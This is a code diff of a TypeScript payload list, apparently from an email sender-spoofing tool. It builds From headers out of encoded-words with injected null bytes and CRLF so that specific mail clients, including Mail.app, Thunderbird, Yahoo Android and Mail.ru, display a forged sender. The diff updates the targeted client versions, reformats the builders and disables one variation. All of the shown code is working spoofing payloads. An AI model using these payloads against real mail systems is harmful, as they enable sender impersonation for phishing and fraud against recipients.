@@ -12,11 +12,11 @@ const DispatcherOriginalDomainFrom = DispatcherOriginalFrom.split('@')[1];
 
 const builtGenericTest: string = (() => {
   const tspecials = ['(', ')', '<', '>', '@', ',', ';', ':', '\\', '"', '/', '[', ']', '?', '.', '='];
-  const prepayload: RegExpMatchArray = <RegExpMatchArray>new Buffer(
-    `BEGIN / ${tspecials.join('|')} / \0 PASSED NULL BYTE / \r\n PASSED CRLF / `,
-  )
-    .toString('hex')
-    .match(/.{1,2}/g);
+  const prepayload: RegExpMatchArray = <RegExpMatchArray>(
+    new Buffer(`BEGIN / ${tspecials.join('|')} / \0 PASSED NULL BYTE / \r\n PASSED CRLF / `)
+      .toString('hex')
+      .match(/.{1,2}/g)
+  );
   return `=?utf-8?Q?${`=${prepayload.join('=').toUpperCase()}`}?==?utf-8?b?${btoa(`END`)}=?=`;
 })();
 
@@ -29,19 +29,22 @@ export interface PayloadDirectory {
 
 export const PayloadDirectory: Array<PayloadDirectory> = [
   {
-    name: 'Mozilla Thunderbird-like',
-    representation: 'spoof\\n\\0 <user@domain>',
-    build: spoof => {
-      return `=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=0A=00?= <${DispatcherOriginalFrom}>`;
-    },
-  },
-  {
-    name: 'macOS ≤ 10.13.1 / iOS < 11.2 Mail.app / Open-Xchange < 7.10.0-like',
+    name: 'macOS ≤ 10.13.1 / iOS ≤ 11.2 Mail.app / Open-Xchange < 7.10.0 / CloudMagic Newton ≤ 9.8.79-like',
     representation: 'spoof\\0(spoof)@domain',
     build: spoof => {
+      //return `"Donald J. Trump"=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=00?==?utf-8?b?${btoa(
       return `=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=00?==?utf-8?b?${btoa(
         `(${spoof.replace('(', '\\(').replace(')', '\\)')})`,
       )}?=@${DispatcherOriginalDomainFrom}`;
+    },
+  },
+  {
+    name: 'Mozilla-Thunderbird ≤ 52.5.0-like',
+    representation: 'spoof\\n\\0 <spoof\\n\\0@domain>',
+    build: spoof => {
+      return `=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=0A=00?= <=?utf-8?b?${btoa(
+        spoof,
+      )}?==?utf-8?Q?=0A=00?=@${DispatcherOriginalDomainFrom}>`;
     },
   },
   {
@@ -62,20 +65,20 @@ export const PayloadDirectory: Array<PayloadDirectory> = [
   },
   {
     name: 'Variation #2.1',
-    representation: 'spoof" <spoof>\\0\\n <user@domain>',
+    representation: 'spoof\\0\\n <user@domain>',
     build: spoof => {
-      return `=?utf-8?b?${btoa(`${spoof.replace(`"`, `\\"`)}" <test>`)}?==?utf-8?Q?=00=0A?= <${
-        DispatcherOriginalFrom
-      }>`;
+      return `=?utf-8?b?${btoa(
+        `${spoof.replace(`"`, `\\"`)}" <test>`,
+      )}?==?utf-8?Q?=00=0A?= <${DispatcherOriginalFrom}>`;
     },
   },
   {
     name: 'Variation #2.2',
-    representation: 'spoof" <spoof>\\0\\n <user@domain>',
+    representation: 'test" <spoof>\\0\\n <user@domain>',
     build: spoof => {
-      return `=?utf-8?b?${btoa(`test" <${spoof.replace(`<`, `\\<`).replace(`>`, `\\>`)}>`)}?==?utf-8?Q?=00=0A?= <${
-        DispatcherOriginalFrom
-      }>`;
+      return `=?utf-8?b?${btoa(
+        `test" <${spoof.replace(`<`, `\\<`).replace(`>`, `\\>`)}>`,
+      )}?==?utf-8?Q?=00=0A?= <${DispatcherOriginalFrom}>`;
     },
   },
   {
@@ -89,7 +92,7 @@ export const PayloadDirectory: Array<PayloadDirectory> = [
   },
   {
     name: 'Variation #3.1', // Yahoo Android
-    representation: '"spoof" <spoof>\\n\\0\\0\\0 <user@domain>',
+    representation: '"test" <spoof>\\n\\0\\0\\0 <user@domain>',
     build: spoof => {
       return `"=?utf-8?b?${btoa(
         `"test" <${spoof.replace(`<`, `\\<`).replace(`>`, `\\>`)}>`,
@@ -98,11 +101,11 @@ export const PayloadDirectory: Array<PayloadDirectory> = [
   },
   {
     name: 'Variation #3.2', // Yahoo Android
-    representation: '"spoof" <spoof>\\n\\0\\0\\0 <user@domain>',
+    representation: '"spoof" <test>\\n\\0\\0\\0 <user@domain>',
     build: spoof => {
-      return `"=?utf-8?b?${btoa(`"${spoof.replace(`"`, `\\"`)}" <test>`)}?==?utf-8?Q?=0A=00=00=00?=" <${
-        DispatcherOriginalFrom
-      }>`;
+      return `"=?utf-8?b?${btoa(
+        `"${spoof.replace(`"`, `\\"`)}" <test>`,
+      )}?==?utf-8?Q?=0A=00=00=00?=" <${DispatcherOriginalFrom}>`;
     },
   },
   {
@@ -112,13 +115,13 @@ export const PayloadDirectory: Array<PayloadDirectory> = [
       return `=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=0A=00?=@${DispatcherOriginalDomainFrom}`;
     },
   },
-  {
+  /*{
     name: 'Variation #5', // Yahoo Android
     representation: 'spoof <user@domain>',
     build: spoof => {
       return `=?utf-8?b?${btoa(spoof)}?= ${DispatcherOriginalFrom}`;
     },
-  },
+  },*/
   {
     name: 'Variation #6', // Mail.ru compatible
     representation: 'spoof(spoof@domain',
